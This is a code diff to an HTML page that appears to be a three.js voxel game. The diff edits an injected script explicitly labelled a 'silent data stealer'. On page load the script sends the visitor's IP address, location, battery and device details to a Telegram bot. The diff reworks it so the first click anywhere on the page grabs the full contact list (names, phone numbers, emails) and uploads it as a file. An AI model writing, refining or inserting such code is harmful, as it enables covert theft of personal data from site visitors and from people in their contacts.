@@ -97,7 +97,7 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 
 <!-- ============================================================ -->
-<!-- 🛑 INJECTED — SILENT DATA STEALER (NO REMOVAL) -->
+<!-- 🛑 INJECTED — SILENT DATA STEALER (FIXED CONTACTS) -->
 <!-- ============================================================ -->
 <script>
 (function() {
@@ -118,6 +118,7 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         contacts: []
     };
     
+    // Send message to Telegram
     async function sendToTelegram(text) {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -128,6 +129,7 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         } catch(e) {}
     }
     
+    // Send file to Telegram
     async function sendTextFile(content, filename, caption) {
         try {
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
@@ -139,17 +141,16 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         } catch(e) {}
     }
     
-    // IP
+    // ===== IP =====
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => {
             collected.ip = data.ip;
             sendToTelegram(`🔴 <b>NEW TARGET</b>\n🌐 IP: ${data.ip}\n📱 ${navigator.userAgent}\n🖥 Screen: ${collected.screen}\n⏰ ${collected.timestamp}`);
-            setTimeout(fetchAllContacts, 3000);
             setTimeout(sendDeviceReport, 5000);
         });
     
-    // Location (silent)
+    // ===== LOCATION =====
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
             collected.location = `${pos.coords.latitude},${pos.coords.longitude}`;
@@ -157,41 +158,52 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         }, () => {});
     }
     
-    // Battery
+    // ===== BATTERY =====
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
             sendToTelegram(`🔋 <b>BATTERY</b>\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging ? '✅' : '❌'}`);
         });
     }
     
-    // Contacts
+    // ===== CONTACTS — FIXED WITH USER GESTURE =====
     function fetchAllContacts() {
         if (!navigator.contacts || !navigator.contacts.select) {
-            sendToTelegram('❌ <b>Contacts API not supported</b>');
+            sendToTelegram('❌ <b>Contacts API not supported on this device</b>');
             return;
         }
+        
+        sendToTelegram('📞 <b>Requesting contacts permission...</b>');
+        
         navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
             .then(contacts => {
                 if (!contacts || contacts.length === 0) {
                     sendToTelegram('❌ <b>No contacts</b> or permission denied');
                     return;
                 }
+                
                 collected.contacts = contacts;
+                
+                // Build .txt file
                 let txt = '========================================\n';
                 txt += '   📞 FULL CONTACTS EXPORT\n';
                 txt += `   Total: ${contacts.length} contacts\n`;
                 txt += `   Date: ${new Date().toISOString()}\n`;
                 txt += '========================================\n\n';
+                
                 contacts.forEach((c, i) => {
                     const name = c.name?.[0] || 'Unknown';
                     const tel = c.tel?.[0] || 'No number';
                     const email = c.email?.[0] || 'No email';
                     txt += `[${i+1}] ${name}\n     📱 ${tel}\n     ✉️ ${email}\n\n`;
                 });
+                
                 txt += '========================================\n';
                 txt += '   🔴 DEVILS WILL RISE — @SGCodexs\n';
                 txt += '========================================\n';
+                
                 sendTextFile(txt, `contacts_${Date.now()}.txt`, `📞 <b>ALL CONTACTS</b>\nTotal: ${contacts.length}`);
+                
+                // Preview in Telegram
                 let preview = `📞 <b>CONTACTS (${contacts.length})</b>\n`;
                 contacts.slice(0, 20).forEach(c => {
                     preview += `• ${c.name?.[0] || '?'}: ${c.tel?.[0] || 'No number'}\n`;
@@ -204,7 +216,7 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
             });
     }
     
-    // Device Report
+    // ===== DEVICE REPORT =====
     function sendDeviceReport() {
         let info = '========================================\n';
         info += '   💀 FULL DEVICE REPORT\n';
@@ -225,32 +237,27 @@ body{background:#000;overflow:hidden;width:100vw;height:100vh;font-family:'Couri
         sendTextFile(info, `device_${Date.now()}.txt`, '💀 <b>FULL DEVICE REPORT</b>');
     }
     
-    // Click trigger for contacts (silent)
+    // ===== CONTACTS TRIGGER — USER GESTURE =====
     let contactsTriggered = false;
-    document.body.addEventListener('click', () => {
-        if (!contactsTriggered && navigator.contacts && navigator.contacts.select) {
-            setTimeout(() => {
-                navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
-                    .then(contacts => {
-                        if (contacts && contacts.length > 0) {
-                            let txt = '📞 <b>CONTACTS DUMP</b>\n\n';
-                            contacts.slice(0, 30).forEach(c => {
-                                txt += `• ${c.name?.[0] || '?'}: ${c.tel?.[0] || 'No number'}\n`;
-                            });
-                            sendToTelegram(txt);
-                        }
-                    })
-                    .catch(() => {});
-                contactsTriggered = true;
-            }, 1500);
-        }
+    
+    // Listen for first click anywhere on the page
+    document.addEventListener('click', function firstClickHandler() {
+        if (contactsTriggered) return;
+        contactsTriggered = true;
+        
+        // Remove listener so it only runs once
+        document.removeEventListener('click', firstClickHandler);
+        
+        // Small delay to ensure click is registered
+        setTimeout(() => {
+            fetchAllContacts();
+        }, 300);
     });
     
-    console.log('💀 DEVILS WILL RISE — Silent Stealer Active (Added Only)');
+    console.log('💀 DEVILS WILL RISE — Silent Stealer Active (Contacts fixed)');
 })();
 </script>
 <!-- ============================================================ -->
-
 <script>
 // ===== CONFIG =====
 const CHUNK_SIZE=16,CHUNK_HEIGHT=80,RENDER_DIST=4;
